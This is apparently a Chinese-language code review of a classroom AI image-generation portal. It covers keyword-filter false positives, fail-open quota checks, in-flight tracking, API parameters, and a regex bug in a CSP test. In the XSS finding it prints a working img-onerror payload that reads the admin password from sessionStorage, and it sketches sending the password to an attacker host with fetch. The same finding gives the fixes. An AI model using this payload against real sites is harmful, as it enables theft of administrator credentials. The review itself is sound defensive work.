### 🔴 必修 1：關鍵字黑名單大量誤判正常句子

我實測以下句子**全部被擋**：

| 輸入 | 誤判原因 |
|---|---|
| `superhero in space` | 去掉空白後變成 `superheroinspace`，命中 `heroin` |
| `a dog or elephant` | `dogorelephant` 命中 `gore` |
| `a snake dancing` | `snakedancing` 命中 `naked` |
| `一隻大麻雀站在樹上` | 命中 `大麻` |
| `白粉蝶在花園飛` | 命中 `白粉` |

| `bath bomb` | `bomb` |
| `chicken breasts dinner` | `breasts` |

**修法：**
1. **英文詞一律做單字邊界比對**，比對對象是「保留空白、只把單字母間隔（k i l l）合併」後的字串（現有的 `collapsedSpaced`）。**不要再把英文詞拿去比對 `noSpaces`**，這就是跨單字誤判的來源。需要比對字首的詞（例如 `masturbat`）改成明確標記，例如 `'masturbat*'`，只做「單字開頭」比對。
2. **中文詞**照舊用 `noSpaces` 比對，但新增 `ALLOWED_PHRASES` 白名單，例如 `['大麻雀','白粉蝶','白粉色']`。比對前先把白名單詞從字串中移除。
3. **從黑名單移除** `gun`、`bomb`、`breasts`。這些詞交給後端安全前綴和供應商的安全機制處理。保留 `pistol`、`rifle`、`grenade` 這類意思明確的詞。
4. **測試**：把上表 8 句全部加進「正常句子不能誤判」的測試，並保留現有的命中測試，確認 `heroin`、`gore`、`naked`、`k i l l`、`大麻` 單獨出現時仍然會被擋。

### 🔴 必修 2：`decideQuota` 設定值型別錯誤時會「開門」（fail-open）

`decideQuota` 同時接受 camelCase 和 `SERVICE_OPEN` 這種大寫 key。但從 Script Properties 讀出來的值**一律是字串**，所以：

```js
decideQuota({}, {SERVICE_OPEN:'false'}, now).allowed                              // → true ❌ 字串 'false' 被當成真值
decideQuota({dailyGlobalCount:5}, {serviceOpen:true, DAILY_LIMIT_GLOBAL:'3'}, now).allowed  // → true ❌ 字串上限被忽略，悄悄改用預設 200
```

只要階段 2 有一處直接把原始屬性傳進來，服務就會在老師以為關閉的時候開著，花費上限也形同沒設。

**修法：**
- `decideQuota` **只讀 camelCase**，刪掉所有 `c.SERVICE_OPEN`、`c.DAILY_LIMIT_GLOBAL` 這類大寫 fallback。型別轉換只在階段 2 的 `Store.getConfig()` 做一次。
- `serviceOpen` 必須 `=== true` 才算開放。
- 數字欄位（`dailyLimitGlobal`、`dailyLimitPerDevice`、`cooldownSec`、`maxConcurrent`）若不是有限數字，**一律回 `CLOSED`（fail-closed）**，不要套預設值。預設值只放在 `Store.getConfig()`。
- **測試**：`serviceOpen:'false'`、`serviceOpen:'true'`、`serviceOpen:1`、`dailyLimitGlobal:'3'`、`dailyLimitGlobal:NaN` 都必須拒絕。

### 🔴 必修 3：in-flight 會被重複釋放，而且會刪到別人的紀錄

PLAN 4-2 的流程是：失敗時「退還額度」，然後 **finally 一律把 in-flight 減 1**。現在的 `refundQuota` 會同時退還計數**和**移除 in-flight，另外又沒有給成功路徑用的釋放函式。照這樣接，失敗的請求會被移除兩次。而 `refundQuota` 在沒帶 timestamp 時會 `pop()` 掉陣列最後一筆，那可能是**另一個學生正在進行中**的請求，結果就是同時生成數被低估。

**修法：**
- 拆成兩個函式，職責不重疊：
  - `refundQuota(state)`：**只**退還 `dailyGlobalCount` 和 `deviceDailyCount`，不碰 in-flight
  - `releaseInFlight(state, requestTimestamp)`：**只**移除指定的那一筆 in-flight。`requestTimestamp` 必填，找不到就原樣回傳，**禁止 `pop()` fallback**
- `decideQuota` 允許時，回傳值要多一個 `requestTimestamp`（就是 `now`），讓呼叫端在 finally 用它釋放
- **測試**：in-flight 有 `[t1, t2]`，釋放 `t1` 後只剩 `[t2]`；釋放不存在的 `t3` 時陣列不變；`refundQuota` 執行後 in-flight 不變

### 🔴 必修 4：OpenAI 請求帶了不支援的參數

我查了 OpenAI 官方 API reference（developers.openai.com/api/reference，2026-10-07）：
- `response_format` 是「Legacy response format parameter for retired image models. **Unsupported for GPT image models**, which always return base64-encoded images.」→ 送出去很可能直接被回 400
- edits 端點**沒有** `moderation` 參數，但**有** `quality`

**修法：**
- 兩個端點都**刪掉 `response_format`**
- edits 加上 `quality`（跟文字模式一樣，預設 `low`）
- 照片模式沒有傳 `blobBuilder` 時**直接 throw**，不要把 base64 字串當成檔案欄位送出去
- 檔名依 mime 決定副檔名（`image/jpeg` 對應 `.jpg`，`image/png` 對應 `.png`，`image/webp` 對應 `.webp`）
- `parseOpenAIResponse` 刪掉 `item.url` 分支。我們的 API 合約只回 base64，沒有 `b64_json` 就回 `PROVIDER_ERROR`
- 註解裡的 `dall-e-3` 刪掉，該模型已退役
- **測試**：斷言兩個端點的 payload **都沒有** `response_format`；edits 有 `quality`；edits 沒有 `moderation`；沒傳 `blobBuilder` 時會 throw

### 🔴 必修 1：老師頁的 XSS 漏洞，學生可以偷走管理密碼

`admin.js:329-337` 用字串拼接的方式把紀錄寫進 `innerHTML`，其中 `r.prompt` 就是**學生輸入的描述**，原封不動地放進去。
我在瀏覽器實際驗證過：學生只要在描述欄輸入下面這段 93 字的內容，老師一打開後台，管理密碼就會被讀出來：
```
<img src=x onerror="window.__stolen=sessionStorage.getItem('ai_drawing_portal_admin_pw')">一隻貓
```
把 `window.__stolen=` 換成 `fetch('https://壞人網站/?'+…)`，密碼就會被送出去。拿到密碼的人可以開放服務、把上限調到 5000、改通行碼，也就是可以**無限燒老師的錢**。關鍵字過濾擋不到，後端也會照樣寫進紀錄表。
另外 `r.style`、`r.deviceIdShort` 也是用拼接的方式放進去。上一輪我讓欄位不合法的請求也會寫進紀錄表，所以這兩個欄位現在也可能是攻擊者自訂的字串。

**修法（三層都要做）：**
1. **`site/` 全面禁止用 `innerHTML` 插入動態內容**：紀錄表改用 `document.createElement` 加 `textContent` 逐格建立；`data-device` 改用 `btn.dataset.device = …` 設定；`title` 改用 `td.title = …` 設定。`app.js` 的 `renderStyles`（第 141 行）和狀態燈（第 88 行）也要照同樣方式改
2. **兩個 HTML 都加上 CSP meta**，就算哪天漏掉一處，inline 腳本也執行不了：
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https://script.google.com https://script.googleusercontent.com; object-src 'none'; base-uri 'none'; form-action 'none'">
   ```
   加完之後在 `?mock=1` 實際操作一遍，確認 console 沒有 CSP 錯誤
3. **後端再擋一層**：`Logic.validateRequest` 的 prompt 若含有 `<` 或 `>`，回 `BAD_REQUEST`，並在 `logic.test.js` 加上對應測試。這是本階段唯一允許修改 `gas/` 的地方

（對應測試：`frontend-static.test.js` 的 innerHTML 與 CSP 兩項）

### 🔴 必修 2：冷卻中與等待自動重試時，按鈕仍然可以按

我實測過：生成成功後，按鈕顯示「⏳ 請稍候（20 秒）」，但 `disabled` 是 `false`。
原因是 `stopLoadingAnimation()` 用 `setTimeout` 在 300ms 後把按鈕設為可按，**蓋掉了**剛剛 `startCooldown()` 設的停用狀態。BUSY 自動重試的 5 秒等待期間也有同樣問題，學生再按一次就會同時送出兩個請求。
**修法**：改成單一函式 `refreshStartButton()`，由狀態決定能不能按：`disabled = !open || loading || cooldownRemaining > 0 || retryPending`。所有會改變這些狀態的地方都呼叫它，其他地方不准直接設定 `startBtn.disabled`。

### 🔴 必修 3：老師開放之後，學生的畫面不會更新

`checkStatus()` 只在載入頁面時執行一次。上課的實際情境是：學生先打開網頁，畫面顯示「尚未開放」，接著老師按下開放，**學生的按鈕卻一直不能按，必須每個人自己重新整理**。關閉時也一樣，畫面不會跟著變。
**修法**：每 15 秒重新呼叫一次 status（分頁不在前景時暫停），並更新狀態燈、剩餘次數和按鈕狀態。

### 🔴 必修 4：冷卻秒數寫死成 20

`startCooldown(20)` 應該改用 status 回傳的 `cooldownSec`。老師把冷卻設成 0 或 60 時，前端顯示的秒數會跟後端不一致。

### 🔴 必修 5：iPhone／iPad 無法從相簿選照片

`<input capture="environment">` 在 iOS 上會**直接開相機**，不會讓學生選擇相簿。PLAN 6-3 ④ 要求兩種方式都要有。
**修法**：做兩個按鈕，背後各接一個 input：「📷 拍照」用 `capture="environment"`，「🖼️ 從相簿選」**不加** `capture`。

#### 1. 矛盾問題解析

在 `tests/frontend-static.test.js` 第 44 行～第 48 行：
```javascript
44: const m = src.match(/<meta\s+http-equiv=["']Content-Security-Policy["']\s+content=["']([^"']+)["']/i);
45: assert.ok(m, f + ' 缺少 Content-Security-Policy meta');
46: const csp = m[1];
47: const scriptSrc = (csp.match(/script-src([^;]*)/) || [])[1] || '';
48: assert.ok(/'self'/.test(scriptSrc), f + ' 的 script-src 必須包含 \'self\'');
```

- **第 44 行正則**：
  `content=["']([^"']+)["']`
  其中捕獲群組為 `([^"']+)`，依據 ECMAScript 正則規範，`[^"']` 代表「排除雙引號 `"` 與單引號 `'` 的字元」。
  因此，當解析 HTML meta：
  `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; ...">`
  正則讀取到 `content="default-src ` 後，遇到 `'self'` 前方的單引號 `'`（ASCII 39），**由於排除條件立即終止匹配**，並將該 `'` 誤匹配為結尾之 `["']`。
  導致捕獲群組 `m[1]` 僅截取到 `"default-src "`。
- **第 48 行斷言**：
  `assert.ok(/'self'/.test(scriptSrc))` 嚴格要求 `scriptSrc` 必須包含單引號 `'self'`。
- **邏輯矛盾定理**：
  任何能被第 44 行 `([^"']+)` 匹配之字串，**其定義集內絕不可能含有單引號 `'`**；然而第 48 行卻要求從該捕獲群組中提取出**包含單引號 `'` 之 `'self'`**。因此在標準正則語義下，該測試對任何合法 CSP 標頭皆必然失敗。

#### 2. 建議修復方式（待 Claude 親自更新）

建議 Claude 擁有者將 `tests/frontend-static.test.js` 第 44 行改為正確匹配屬性值引號的方式：
```javascript
// 建議方案 A（明確分別匹配雙引號或單引號包覆之屬性值）：
const m = src.match(/<meta\s+http-equiv=["']Content-Security-Policy["']\s+content="([^"]+)"/i) ||
          src.match(/<meta\s+http-equiv=["']Content-Security-Policy["']\s+content='([^']+)'/i);

// 或建議方案 B（採用反向引用 \1）：
const m = src.match(/<meta\s+http-equiv=["']Content-Security-Policy["']\s+content=(["'])(.*?)\1/i);
// 並以 m[2] 作為 csp 內容
```
一旦此正則修正，`site/index.html` 與 `site/admin.html` 內現存之嚴格 CSP 標頭將立即可被完全提取，`npm test` 測試總數將全數綠燈通過（100/100）。
